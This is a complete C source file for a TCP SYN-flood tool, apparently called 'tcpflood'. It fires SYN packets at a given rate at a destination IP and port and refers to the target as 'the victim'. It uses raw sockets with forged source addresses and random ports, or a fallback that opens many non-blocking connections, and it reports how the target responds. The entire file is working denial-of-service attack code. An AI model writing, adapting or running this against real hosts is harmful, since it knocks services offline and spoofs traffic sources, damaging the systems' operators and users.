#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <math.h>
#include <unistd.h>
#include <signal.h>

#ifndef TEMP_FAILURE_RETRY
#define TEMP_FAILURE_RETRY(expression) \
    ({ \
        long int _result; \
        do _result = (long int) (expression); \
        while (_result == -1L && errno == EINTR); \
        _result; \
    })
#endif



struct sockaddr_in src, dst;

struct pseudo_header{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};
unsigned short csum(unsigned short* ptr, int nbytes) {
	long sum;
	unsigned short oddbyte;
	short answer;

	sum=0;
	while(nbytes>1){
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1){
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum=(sum>>16)+(sum & 0xffff);
	sum=sum+(sum>>16);
	answer=(short)~sum;

	return answer;
}

int s=-1;
void initraw(const char* thisprogram){
	s=socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
	if(s==-1){
		fprintf(stderr, "Error creating socket. Error number: %d. Error message: %s\n"
				"Raw sockets need rights. Run this program with sudo, or do first:\n"
				"sudo setcap cap_net_raw=eip %s\n"
				"Or use the lousy method (specify the lingertime option)\n", errno, strerror(errno), thisprogram);
		exit(1);
	}
	printf("Statistics unavailable in this mode. But since you can use raw sockets, you must be able to use tcpstat.\n");
}
void withraw(){
	struct{
		struct iphdr iph;
		struct tcphdr tcph;
	} __attribute__ ((packed)) packet;
	memset(&packet, 0, sizeof(packet));
	packet.iph.ihl=5;
	packet.iph.version=4;
	packet.iph.id=rand();
	packet.iph.frag_off=0x40;	//Don't fragment
	packet.iph.ttl=255;
	packet.iph.protocol=IPPROTO_TCP;
	packet.iph.saddr=src.sin_addr.s_addr;
	packet.iph.daddr=dst.sin_addr.s_addr;

	packet.tcph.source=src.sin_port;
	packet.tcph.dest=dst.sin_port;
	packet.tcph.seq=(rand()%0x10000)|((rand()%0x10000)<<16);
	packet.tcph.doff=5;
	packet.tcph.syn=1;
	packet.tcph.window=htons(5840);

	struct pseudo_header psh;
	psh.source_address=src.sin_addr.s_addr;
	psh.dest_address=dst.sin_addr.s_addr;
	psh.placeholder=0;
	psh.protocol=IPPROTO_TCP;
	psh.tcp_length=htons(20);
	memcpy(&psh.tcp, &packet.tcph, sizeof(packet.tcph));
	packet.tcph.check=csum((unsigned short*)&psh, sizeof(psh));

	ushort saveddestport=dst.sin_port;	//port should be zero.
	dst.sin_port=0;
	if(sendto(s, &packet, sizeof(packet), 0, (struct sockaddr*)&dst, sizeof(dst))<0){
		fprintf(stderr, "Error in sendto. Error number: %d. Error message: %s\n", errno, strerror(errno));
		exit(1);
	}
	dst.sin_port=saveddestport;
}

enum CONNECT_ACK{
	UNK=0, OK, RST, TOUT
};

struct{
	int s;
	struct sockaddr_in dst;
}* socketqueue;
int queuelen;
int queuepointer=0;
enum CONNECT_ACK results[10000];
int resultsptr=0;
void initconnect(float pps, float lingertime){
	queuelen=pps*lingertime;
	if(!queuelen) queuelen=1;
	if(!(socketqueue=malloc(queuelen*sizeof(*socketqueue)))){
		fprintf(stderr, "Cannot allocate socket queue.\n");
		exit(1);
	}
	int i;
	for(i=0; i<queuelen; i++) socketqueue[i].s=-1;
	for(i=0; i<sizeof(results)/sizeof(*results); i++) results[i]=UNK;
	printf("Lousy method. Socket queue length of %d\n"
			"Note that statistics aren't reliable if lingertime is not fairly greater than the round trip time to the victim.\n"
			"Stats:\tacked\tRSTed\ttimeout\tunkown\n", queuelen);
}
void withconnect(){
	static time_t laststats=-1;

	time_t t;
	if(laststats==-1) laststats=time(0);
	else if((t=time(0))-laststats>0){
		laststats=t;
		int i;
		int stats[4]={0};
		for(i=0; i<sizeof(results)/sizeof(*results); i++) stats[results[i]]++;
		printf("\t%d\t%d\t%d\t%d\n", stats[OK], stats[RST], stats[TOUT], stats[UNK]);
	}

	int s=socketqueue[queuepointer].s;
	if(s!=-1){
		enum CONNECT_ACK* res=results+resultsptr;
		int connect2=connect(s, (struct sockaddr*)&socketqueue[queuepointer].dst, sizeof(socketqueue[queuepointer].dst));
		if(connect2==-1){
			if(errno==ECONNREFUSED) *res=RST;
			else if(errno==EALREADY) *res=TOUT;
			else *res=UNK;
		}
		else *res=OK;
		resultsptr++;
		resultsptr%=sizeof(results)/sizeof(*results);
		close(socketqueue[queuepointer].s);
	}
	s=socketqueue[queuepointer].s=socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK, 0);
	memcpy(&socketqueue[queuepointer].dst, &dst, sizeof(dst));
	if(s==-1){
		fprintf(stderr, "Error creating socket. Error number: %d. Error message: %s\n", errno, strerror(errno));
		exit(1);
	};
	int one=1;
	if(setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one))<0){
		fprintf(stderr, "Error setting SO_REUSEADDR. Error number: %d. Error message: %s\n", errno, strerror(errno));
		exit(1);
	}
	if((src.sin_addr.s_addr || src.sin_port) && bind(s, (struct sockaddr*)&src, sizeof(src))<0){
		fprintf(stderr, "Error binding socket. Error number: %d. Error message: %s\n", errno, strerror(errno));
		exit(1);
	}
	if(connect(s, (struct sockaddr*)&dst, sizeof(dst))<0 && errno!=EINPROGRESS){
		fprintf(stderr, "Error connecting socket. Error number: %d. Error message: %s\n", errno, strerror(errno));
		exit(1);
	}
	queuepointer++;
	queuepointer%=queuelen;
}

void terminator(int signal){
	exit(0);
}

int main(int argc, char *argv[]){
	if(argc<6 || argc>7){
		fprintf(stderr,
				"Usage: %s srcip srcport dstip dstport pps [lingertime]\n"
				"If srcip is 0.0.0.0, OS will bind to the default interface.\n"
				"Ports can be either 0 (OS picks one), 1-65535 or rnd (random each packet)\n"
				"pps: packets per second\n"
				"lingertime: use lousy method (connect() calls). The value tells how long in seconds a socket is left open to let the OS shuttle the SYN packet. "
				"With the lousy method you should leave sourceport 0 or rnd. "
				"Note that pps*lingertime must not exceed the limit of maximum number of open files (run 'ulimit -n' to check its current value)\n"
				"Terminate me with SIGKILL or SIGTERM:\n"
				"killall -s SIGKILL tcpflood\n",
				argv[0]);
		return 1;
	}
	int rndsport=0, rnddport=0, lousymethod=0;
	float pps=0, lingertime=0;
	if(!inet_aton(argv[1], &src.sin_addr) || !inet_aton(argv[3], &dst.sin_addr)){
		fprintf(stderr, "invalid src or dst ip\n");
		return 1;
	}
	if(!strcmp(argv[2], "rnd")) rndsport=1;
	else if(sscanf(argv[2], "%hu", &src.sin_port)!=1){
		fprintf(stderr, "Invalid source port %s\n", argv[2]);
		return 1;
	}
	else src.sin_port=htons(src.sin_port);
	if(!strcmp(argv[4], "rnd")) rnddport=1;
	else if(sscanf(argv[4], "%hu", &dst.sin_port)!=1){
		fprintf(stderr, "Invalid destination port %s\n", argv[4]);
		return 1;
	}
	else dst.sin_port=htons(dst.sin_port);
	if(sscanf(argv[5], "%f", &pps)!=1 || !isfinite(pps) || pps<=0){
		fprintf(stderr, "Invalid pps %s\n", argv[5]);
		return 1;
	}
	if(argc==7){
		lousymethod=1;
		if(sscanf(argv[6], "%f", &lingertime)!=1 || !isfinite(lingertime) || lingertime<=0){
			fprintf(stderr, "Invalid lingertime %s\n", argv[6]);
			return 1;
		}
	}
	srand(time(0));
	src.sin_family=dst.sin_family=AF_INET;
	if(lousymethod){
		if(rndsport) rndsport=src.sin_port=0;
		initconnect(pps, lingertime);
	}
	else initraw(argv[0]);

	signal(SIGKILL, terminator);
	signal(SIGTERM, terminator);

	while(1){
		double integer;
		struct timespec tosleep;
		tosleep.tv_nsec=modf(1/pps, &integer)*1000000000;
		tosleep.tv_sec=integer;
		if(rndsport) src.sin_port=htons((rand()%0xFFFF)+1);
		if(rnddport) dst.sin_port=htons((rand()%0xFFFF)+1);
		if(lousymethod) withconnect(); else withraw();
		if(TEMP_FAILURE_RETRY(nanosleep(&tosleep, &tosleep))<0){
			fprintf(stderr, "Error in nanosleep. Error number: %d. Error message: %s\n", errno, strerror(errno));
			return 1;
		}
	}

	return 0;
}
